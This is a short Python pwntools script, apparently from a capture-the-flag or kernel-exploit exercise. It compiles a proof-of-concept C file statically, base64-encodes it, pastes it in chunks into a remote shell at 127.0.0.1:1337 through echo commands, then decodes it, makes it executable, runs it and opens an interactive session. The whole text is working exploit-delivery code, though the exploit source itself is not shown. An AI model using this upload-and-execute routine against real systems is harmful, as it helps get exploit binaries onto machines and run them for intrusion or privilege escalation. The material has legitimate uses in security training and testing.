from pwn import *
import subprocess
result = subprocess.run('musl-gcc poc.c -o poc -static && base64 -w0 poc', shell=True, stdout=subprocess.PIPE).stdout
#context.log_level='DEBUG'
p = remote('127.0.0.1', 1337)
p.sendlineafter(b'$', b'stty -onlcr') # https://stackoverflow.com/a/38860632/13734176

log.info('sending exploit file')
x=512
for i in range(0, int(len(result)/x)+1):
    payload = b'echo "%s" >> bin' % (result[i*x:x*(i+1)])
    p.sendlineafter(b'$', payload)
    print('.',end='')
print()

p.sendlineafter(b'$', b'base64 -d bin > exploit && chmod +x exploit')
p.sendlineafter(b'$', b'./exploit')
p.interactive()